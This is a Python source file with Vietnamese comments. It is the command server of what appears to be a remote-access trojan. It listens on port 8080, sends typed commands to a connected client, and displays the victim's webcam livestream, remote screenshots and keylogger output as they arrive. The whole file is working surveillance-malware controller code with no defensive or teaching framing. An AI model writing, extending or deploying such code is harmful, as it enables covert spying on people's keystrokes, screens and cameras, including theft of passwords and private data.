import socket
import struct
import cv2
import numpy as np


def recvall(conn, n):
    data = bytearray()
    while len(data) < n:
        packet = conn.recv(n - len(data))
        if not packet:
            return None
        data.extend(packet)
    return data


def receive_stream(conn):
    print("Đang nhận luồng Webcam... (Bấm 'q' trên cửa sổ video để thoát)")
    payload_size = struct.calcsize("L")

    while True:
        raw_msglen = recvall(conn, payload_size)
        if not raw_msglen:
            break
        msglen = struct.unpack("L", raw_msglen)[0]

        frame_data = recvall(conn, msglen)
        if frame_data is None:
            break

        nparr = np.frombuffer(frame_data, np.uint8)
        frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        cv2.imshow('Webcam Livestream', frame)

        if cv2.waitKey(1) & 0xFF == ord('q'):
            break

    cv2.destroyAllWindows()


# --- HÀM NHẬN ẢNH CHỤP MÀN HÌNH MỚI THÊM VÀO ---
def receive_screenshot(conn):
    print("Đang nhận dữ liệu ảnh màn hình từ Client...")
    payload_size = struct.calcsize("L")

    # B1: Nhận 4 bytes kích thước
    raw_msglen = recvall(conn, payload_size)
    if not raw_msglen:
        print("Không nhận được kích thước ảnh.")
        return
    msglen = struct.unpack("L", raw_msglen)[0]

    # B2: Nhận đủ số lượng bytes của bức ảnh
    frame_data = recvall(conn, msglen)
    if frame_data is None:
        print("Dữ liệu ảnh bị lỗi.")
        return

    # B3: Giải mã và hiển thị tấm ảnh đơn lẻ lên
    nparr = np.frombuffer(frame_data, np.uint8)
    frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)

    cv2.imshow('Remote Screenshot', frame)
    print("👉 Đã hiển thị ảnh! Hãy click vào cửa sổ ảnh và bấm PHÍM BẤT KỲ để tiếp tục gõ lệnh.")
    cv2.waitKey(0)  # Số 0 nghĩa là đứng yên đợi cho đến khi người dùng bấm phím bất kỳ
    cv2.destroyWindow('Remote Screenshot')  # Đóng cửa sổ ảnh chụp màn hình lại


def receive_key_logger(conn):
    print("Đang nhận dữ liệu Keylogger... (Nhấn 'Esc' trên máy Client để kết thúc dữ liệu)")
    while True:
        data = conn.recv(1024)
        if not data:
            break
        decoded_data = data.decode('utf-8', errors='ignore')

        if "[ESC_STOP]" in decoded_data:
            print("\n[+] Keylogger stopped by client.")
            break
        print(decoded_data, end='', flush=True)

# --- PHẦN LUỒNG CHÍNH CỦA SERVER ---
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('0.0.0.0', 8080))
server.listen(1)

print("Đang chờ kết nối...")
conn, addr = server.accept()
print(f"Đã kết nối với {addr}")

conn.sendall(b'Hello from server!')
messages = conn.recv(1024).decode()
print(messages)

cmd = input('enter command: ')
while cmd != 'exit':
    conn.sendall(bytes(cmd, 'utf-8'))

    if cmd == 'stream':
        receive_stream(conn)
    elif cmd == 'screenshot':
        receive_screenshot(conn)
    elif cmd == 'keylogger':
        receive_key_logger(conn)
    cmd = input('enter command: ')

conn.close()
